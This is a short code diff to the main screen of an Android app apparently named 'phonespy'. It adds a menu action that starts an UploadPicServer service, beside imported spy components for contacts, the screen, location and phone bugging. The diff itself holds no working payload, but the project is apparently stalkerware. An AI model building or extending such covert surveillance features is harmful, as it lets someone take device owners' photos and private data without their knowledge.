@@ -20,6 +20,7 @@ import info.peoce.phonespy.Listener.LocationListener;
 import info.peoce.phonespy.R;
 import info.peoce.phonespy.Server.PhoneBugServer;
 import info.peoce.phonespy.Server.ScreenCaptureServer;
+import info.peoce.phonespy.Server.UploadPicServer;
 import info.peoce.phonespy.Util.Others;
 import info.peoce.phonespy.Util.SpyContactsInfo;
 import info.peoce.phonespy.Util.SpyScreen;
@@ -82,6 +83,10 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 break;
             case R.id.action_stopScreensaver:
                 stopService(bg_screenCap);
+                break;
+            case R.id.action_uploadPic:
+                Intent intent = new Intent(this, UploadPicServer.class);
+                startService(intent);
                 break;
         }
 
